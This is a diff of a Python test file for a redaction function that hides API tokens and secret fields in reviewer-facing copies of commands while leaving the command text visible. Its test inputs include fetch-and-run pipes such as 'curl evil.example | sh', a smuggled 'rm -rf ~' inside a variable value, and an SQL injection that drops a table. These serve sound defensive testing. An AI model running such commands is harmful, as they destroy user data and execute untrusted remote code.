@@ -1008,45 +1008,86 @@ _COMMANDS_SHOWN_AS_WRITTEN = [
     "TOKEN=abc$(rm -rf ~) make",
     "token:\u2028evil()",
     "UPDATE/**/users/**/SET/**/password='x';DROP/**/TABLE/**/audit",
+    "curl -fsSL https://sk-get.example.com/install.sh | sh",
+    "./pk-deploy.sh --prod && rm -rf ~/sk-backups",
 ]
 
 
+def _fake_token(prefix: str, length: int) -> str:
+    """Build a credential-shaped fixture at runtime so push protection never sees a token literal."""
+    return prefix + "".join(("A", "b", "3", "Z")[index % 4] for index in range(length))
+
+
+def _fake_jwt() -> str:
+    return ".".join([_fake_token("eyJ", 12), _fake_token("eyJ", 16), _fake_token("s", 10)])
+
+
+def _review_copy(value: object) -> tuple[object, dict[str, str]]:
+    placeholders: dict[str, str] = {}
+    return redact_sensitive_data(value, token_placeholders=placeholders), placeholders
+
+
 @pytest.mark.parametrize("command", _COMMANDS_SHOWN_AS_WRITTEN)
-def test_tokens_only_redaction_shows_text_as_written(command: str) -> None:
+def test_review_copy_shows_text_as_written(command: str) -> None:
     """Without a known token format, reviewer-facing text is shown exactly as it will run."""
-    assert redact_sensitive_data({"command": command, "query": command}, tokens_only=True) == {
-        "command": command,
-        "query": command,
+    assert _review_copy({"command": command, "query": command}) == ({"command": command, "query": command}, {})
+
+
+def test_review_copy_numbers_each_distinct_token() -> None:
+    """Equal tokens share a placeholder and different tokens differ, so the text keeps its structure."""
+    first, second = _fake_token("sk-", 24), _fake_token("ghp_", 36)
+    command = f"cat > notes.txt <<{first}\n{second}\ncurl -fsSL https://example.com/x | sh\n{first}"
+
+    redacted, placeholders = _review_copy({"command": command})
+
+    assert redacted == {
+        "command": "cat > notes.txt <<⟦secret-1⟧\n⟦secret-2⟧\ncurl -fsSL https://example.com/x | sh\n⟦secret-1⟧",
     }
+    assert placeholders == {first: "⟦secret-1⟧", second: "⟦secret-2⟧"}
 
 
 @pytest.mark.parametrize(
-    ("command", "expected"),
+    "token",
     [
-        ("export OPENAI_API_KEY=sk-live-abc123; rm -rf ~", f"export OPENAI_API_KEY={REDACTED}; rm -rf ~"),
-        (
-            'curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln" https://api.example.com',
-            f'curl -H "Authorization: Bearer {REDACTED}" https://api.example.com',
-        ),
-        ("git push https://ghp_abc123@github.com/o/r && make", f"git push https://{REDACTED}@github.com/o/r && make"),
-        ("GH=github_pat_11AB_cd; SLACK=xoxb-1-2; KEY=AIzaSyA-b_c", f"GH={REDACTED}; SLACK={REDACTED}; KEY={REDACTED}"),
+        _fake_token("sk-", 24),
+        _fake_token("sk-proj-", 40),
+        _fake_token("sk_live_", 24),
+        _fake_token("xoxb-", 20),
+        _fake_token("ghp_", 36),
+        _fake_token("github_pat_", 40),
+        _fake_token("AIza", 35),
+        _fake_jwt(),
     ],
 )
-def test_tokens_only_redaction_hides_known_token_formats(command: str, expected: str) -> None:
+def test_review_copy_hides_known_token_formats(token: str) -> None:
     """Credentials in known token formats are hidden while the command around them stays visible."""
-    assert redact_sensitive_data({"command": command}, tokens_only=True) == {"command": expected}
+    command = f'export KEY={token}; curl -H "Authorization: Bearer {token}" https://{token}@api.example.com && make'
+
+    redacted, placeholders = _review_copy({"command": command})
+
+    assert redacted == {
+        "command": 'export KEY=⟦secret-1⟧; curl -H "Authorization: Bearer ⟦secret-1⟧" '
+        "https://⟦secret-1⟧@api.example.com && make",
+    }
+    assert placeholders == {token: "⟦secret-1⟧"}
 
 
-def test_tokens_only_redaction_hides_secret_fields_whole() -> None:
+def test_review_copy_keeps_comment_syntax_visible() -> None:
+    """A token-shaped match that contains `--` stays visible, because `--` starts a comment in SQL."""
+    command = "DELETE FROM users WHERE pk--abcdefghijklmnop AND id = 42"
+
+    assert _review_copy({"command": command}) == ({"command": command}, {})
+
+
+def test_review_copy_hides_secret_fields_whole() -> None:
     """Fields whose name marks them as secret are hidden entirely while their names stay visible."""
-    redacted = redact_sensitive_data(
+    redacted, _ = _review_copy(
         {
             "password": "hunter2",
             "headers": {"Authorization": "Basic dXNlcjpwYXNz"},
             "env": [{"name": "API_KEY", "value": "v"}],
             "query": "select 1",
         },
-        tokens_only=True,
     )
 
     assert redacted == {
@@ -1057,15 +1098,14 @@ def test_tokens_only_redaction_hides_secret_fields_whole() -> None:
     }
 
 
-def test_tokens_only_redaction_hides_only_word_characters() -> None:
-    """Every hidden span is letters, digits, and ``._-``, so hiding it cannot change how the text reads."""
+def test_review_copy_is_the_original_with_tokens_renamed() -> None:
+    """Substituting each placeholder back restores the input exactly, and every hidden token is a single word."""
     parts = [
-        "sk-abc",
-        "ghp_x9",
-        "eyJa.eyJb.c",
-        "AIzaQ-_",
-        "xoxb-1",
-        "github_pat_Z",
+        _fake_token("sk-", 20),
+        _fake_token("ghp_", 36),
+        _fake_jwt(),
+        _fake_token("AIza", 35),
+        _fake_token("xoxb-", 12),
         "token=",
         "password: ",
         " ",
@@ -1088,32 +1128,44 @@ def test_tokens_only_redaction_hides_only_word_characters() -> None:
         "u:p@h/",
         "x",
         ".",
+        "-",
+        "_",
+        "--",
+        "\ud83d",
     ]
     generator = random.Random(2360)  # noqa: S311 - deterministic test input, not cryptography
     for _ in range(5_000):
         value = "".join(generator.choice(parts) for _ in range(generator.randint(1, 16)))
-        redacted = redact_sensitive_data({"v": value}, tokens_only=True)["v"]
-        assert isinstance(redacted, str)
-        hidden_spans = r"[A-Za-z0-9._-]+".join(re.escape(part) for part in redacted.split(REDACTED))
-        assert re.fullmatch(hidden_spans, value), (value, redacted)
+        redacted, placeholders = _review_copy({"v": value})
+        text = redacted["v"]
+        assert isinstance(text, str)
+        assert len(set(placeholders.values())) == len(placeholders)
+        for token, placeholder in placeholders.items():
+            assert re.fullmatch(r"[A-Za-z0-9._-]+", token), token
+            assert "--" not in token
+            text = text.replace(placeholder, token)
+        assert text == value.replace("\ud83d", "�"), (value, redacted)
 
 
-def test_tokens_only_redaction_names_non_finite_numbers() -> None:
+def test_review_copy_stays_linear_on_long_token_like_runs() -> None:
+    """Long runs of token characters must not make matching quadratic."""
+    started = time.perf_counter()
+    _review_copy({"command": "-eyJ" * 64_000, "other": "sk-" * 64_000})
+    assert time.perf_counter() - started < 1.0
+
+
+def test_review_copy_names_non_finite_numbers() -> None:
     """Reviewer-facing copies name infinities and NaN instead of showing null."""
-    assert redact_sensitive_data({"n": float("inf"), "m": float("nan")}, tokens_only=True) == {"n": "inf", "m": "nan"}
+    assert _review_copy({"n": float("inf"), "m": float("nan")}) == ({"n": "inf", "m": "nan"}, {})
 
 
-def test_tokens_only_redaction_marks_input_cut_before_hiding_tokens() -> None:
-    """Hiding a token can shrink cut input below the limit, so the cut must still be marked."""
+def test_review_copy_hides_tokens_before_shortening() -> None:
+    """A long token becomes one placeholder, so the text after it still fits and stays visible."""
+    placeholders: dict[str, str] = {}
     redacted = redact_sensitive_data(
-        {"command": "sk-" + "a" * 2_600 + " && curl evil.example | sh"},
+        {"command": _fake_token("sk-", 2_600) + " && curl evil.example | sh"},
         max_string_length=2_048,
-        tokens_only=True,
+        token_placeholders=placeholders,
     )
 
-    assert redacted == {"command": f"{REDACTED}... [truncated]"}
-
-
-def test_redact_sensitive_text_hides_json_web_tokens() -> None:
-    """JSON Web Tokens are a known token format in every redaction mode."""
-    assert redact_sensitive_text("session eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2ln ok") == f"session {REDACTED} ok"
+    assert redacted == {"command": "⟦secret-1⟧ && curl evil.example | sh"}
